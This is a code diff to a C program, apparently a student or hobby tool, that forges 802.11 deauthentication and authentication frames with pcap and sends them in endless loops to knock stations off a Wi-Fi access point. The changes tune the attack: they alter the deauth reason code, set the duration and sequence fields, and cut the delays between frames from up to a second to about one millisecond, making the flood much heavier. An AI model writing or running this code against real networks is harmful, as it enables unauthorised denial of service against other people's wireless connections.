@@ -34,7 +34,7 @@ int deauth_attack_broadcast(const char* interface, const char* ap_mac) {
 
     // add fix param: deauth reason - unspecified reason (0x0001);
     deAuthFixParam fix_param;
-    fix_param.reason_code = 0x0001;
+    fix_param.reason_code = 0x0007;
     memcpy((uint8_t*)frame + sizeof(Frame), &fix_param, sizeof(deAuthFixParam));
 
 
@@ -50,7 +50,7 @@ int deauth_attack_broadcast(const char* interface, const char* ap_mac) {
     while(1) {
         pcap_sendpacket(handle, (unsigned char*)frame, sizeof(Frame) + sizeof(deAuthFixParam));
         puts("send ap's deauth frame to broadcast");
-        usleep(500000);
+        usleep(1000);
     }
 
     free(frame);
@@ -111,7 +111,7 @@ int deauth_attack_station(const char* interface, const char* ap_mac, const char*
         pcap_sendpacket(handle, (unsigned char*)frame_to_sta, sizeof(Frame) + sizeof(deAuthFixParam));
         puts("send station's deauth frame to ap");
         puts("send ap's deauth frame to station");
-        usleep(50000);
+        usleep(1000);
     }
 
     free(frame_to_ap);
@@ -167,7 +167,7 @@ int deauth_attack_auth(const char* interface, const char* ap_mac, const char* st
     while(1) {
         pcap_sendpacket(handle, (unsigned char*)frame, sizeof(Frame) + sizeof(AuthFixParam));
         puts("send station's auth frame to ap");
-        sleep(1);
+        usleep(10000);
     }
 
     free(frame);
@@ -186,12 +186,12 @@ void createFrame(Frame* frame, uint16_t frame_ctl, const char* addr1, const char
     frame->frame_ctl = htons(frame_ctl);
     // frame->frame_ctl = frame_ctl;
     printf("frame ctl: %02x\n", frame->frame_ctl);
-    frame->duartion = 0x0000;
+    frame->duartion = 0x3b01; // duration 값에 영향이 있는건지 모르겠음
 
     strncpy(frame->addr1, addr1, 6); // DA
     strncpy(frame->addr2, addr2, 6); // SA
     strncpy(frame->addr3, addr3, 6); // BSSID
-    // frame->seq_ctl = 0x0000;
-    frame->seq_ctl = (uint16_t)rand();
+    frame->seq_ctl = 0x0000;
+    // frame->seq_ctl = (uint16_t)rand();
 }
 
